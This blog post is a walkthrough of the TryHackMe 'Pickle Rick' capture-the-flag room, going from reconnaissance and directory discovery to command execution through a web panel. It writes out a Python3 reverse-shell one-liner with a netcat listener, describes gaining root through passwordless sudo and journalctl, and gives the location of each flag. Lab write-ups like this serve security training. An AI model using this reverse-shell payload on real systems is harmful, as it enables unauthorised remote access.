---
title: "THM: Pickle Rick CTF"

created: May 9, 2022 3:11 PM
last edited: May 9, 2022 7:04 PM
tags: 
- CTF
- Cybersecurity
- THM
- Web Exploitation

layout: post
category: blog
---

Ayo! If you are on the Web Hacking Fundamentals path on TryHackMe, [the Pickle Rick CTF](https://tryhackme.com/room/picklerick) is the last room to test the knowledge and skills you have gained. Here is my writeup for it.

## Brief—TL;DR

Steps taken in this CTF include:

1. Port Scanning with `nmap` 
2. Information gathering on the open port (if you want to dig deeper, you may also include the public vulnerabilities related to the certain used technology, e.g., Apache 2.4.18)
3. Path discovery on the web server with `gobuster` or `dirbuster`
4. Sneaking around
5. Getting a reverse shell
6. Privilege escalation by getting a root shell

---

## Reconnaissance 🔍

### 1. Port Scanning

Let’s get started with `nmap`

![Fig1: nmap result on the targeted maching]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled.png)

Fig1: nmap result on the targeted maching

### 2. Gathering information

Let’s go to the website and view page source:

![Fig 2: page source of the landing page]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled1.png)

Fig 2: page source of the landing page

We got some information here, `Username: R1ckRul3s`. The password is unknown. Keep looking. , while running it in the background, let’s check out some other things.

Let’s check `robots.txt`, in case, it might disallow some valuable paths.

😂 NOTHING, excepts ...

![Fig 3: robots.txt]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled2.png)

Fig 3: robots.txt

Okay, we got another piece, just in case, though, I don’t really know what that’s for.

### 3. Path discovery

What path on the web could be a login page? 🤔 Shall we do `dirbuster` or `gobuster` to find out directories. Let’s do it!

It’ll take a while...

There are directories found, including `/assets/`, `/icon/`, `denied.php`, `/login.php`, and `/portal.php`. I tried going to `/denied.php`, it redirected me to `/login.php`. Alright, we got one step closer. Use the username and other info we have collected. Turned out, that the content on `robots.txt` is the password! Boom 🧨

### 4. Sneaking around

Once successfully logged in, we will be at `/portal.php`. There are menus but only `Command` menu seems to be able to access.

![Fig 4: /portal.php]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled3.png)

Fig 4: /portal.php

Let’s try entering some commands ⌨️

I tried `ls` command:

![Fig 5: results of `ls` command]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled4.png)

Fig 5: results of `ls` command

There are two outstanding files: `Sup3rS3cretPickl3Ingred.txt` and `clue.txt`. Let’s `cat` out. Oo oh, we cannot! Well, we can try `less`. And we got it!

<aside>
💡 One other thing you can play around here to get more information, you can execute `grep -R .`, where `-R .` is the RegEx matching anything. It will show anything on every file in the current directory. View the page source and you will see pieces of code as well.

Just have fun with it 😉

![Fig 6: results of `grep -R .` command]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled5.png)

Fig 6: results of `grep -R .` command

</aside>

To get all other ingredients, we can actually use the interface to execute a command, but it’s a bit of a pain in the a**, and limit our creativity. And as the ultimate goal here is to own the server, why don’t we try to get the reverse shell 👀

Before that, let’s check what else is on the server, e.g., Python, netcat, etc. In my case, I checked Python and Python3 by using a command `which Python` and `which Python3`. And there is a Python3 installed on the server.

![Fig 7: result of `which python3` command]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled6.png)

Fig 7: result of `which python3` command

## Weaponization 💌

### 5. Getting a reverse shell

Now we know that there is Python3 installed, we can find the payload to get a reverse shell. Heading to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python), and get the script for python. Then making sure to change `python` to `python3` and your IP address.

In my case, I used the following script:

```bash
export RHOST="<LOCAL_IP_ADDRESS>";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

<aside>
💡 Remember to change `RHOST` and `RPORT` to your local machine and port you are going to use for local `netcat`.

</aside>

Before executing the command, go to local machine and start listener:

```bash
$: nc -lvnp 4444
```

Whoops, there we go! We got the reverse shell.

![Fig 8: reverse shell on local machine listening on port 4444]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled7.png)

Fig 8: reverse shell on local machine listening on port 4444

Now, it’s time to escalate 🔓

## Command& Control (C2)

### 6. Privilege Escalation

Using `sudo -l` to see things that this user can execute as a root user. Turned out, this user can use `sudo` command with *everything* and ***without a password*** 💥

![Fig 9: user’s permission with `sudo` command]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled8.png)

Fig 9: user’s permission with `sudo` command

Okay, cool. We can go to `/home` and see who else is here.

There are `Rick` and `Ubuntu`, so the guess is Rick would be the REAL Rick. Let’s check it out. 

![Fig 10: list of files under `/home/rick` directory]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled9.png)

Fig 10: list of files under `/home/rick` directory

We got the second one 👍

Keep going. Now, we should go to `/root` and see what’s there. If we tried `cd /root`, it will be a permission denied shout out. We can’t really go there. If you want you can use `sudo` to see what’s inside `/root`

```bash
$: sudo ls /root
```

You should be able to get the third ingredient. And that’s done 👍

**BUT BUT BUT . . .**

### Advanced 🤫

**BUT** I wanted more, I manipulated some other files and get a rot shell since this user can use `sudo` with anything and doesn’t require a password for it. One way I remember is by launching shell via `journalctl`. Other ways, heading to [GTFOBins](https://gtfobins.github.io/) to explore 😉

![Fig 12: root shell through `journalctl` and list of files under `/root` directory]({{ site.baseurl }}/assets/posts/2022-05-09-THM-Pickle-Rick-CTF/Untitled10.png)

Fig 12: root shell through `journalctl` and list of files under `/root` directory

---

## Recap for answers:

If you read until this point, thank you 😃 You can execute all command and get all ingredients through through the website. I’ll put the destination below for each ingredient, but I do hope you try out some other way to break in and own the server.

### Task 1:

The first ingredient is on the `Sup3rS3cretPickl3Ingred.txt` file. With `less` command, you can execute on the interface.

### Task 2:

The second ingredient is in `/home/rick` directory.

### Task 3:

The third ingredient is in `/root` directory.

Happy hacking 🧙‍♀️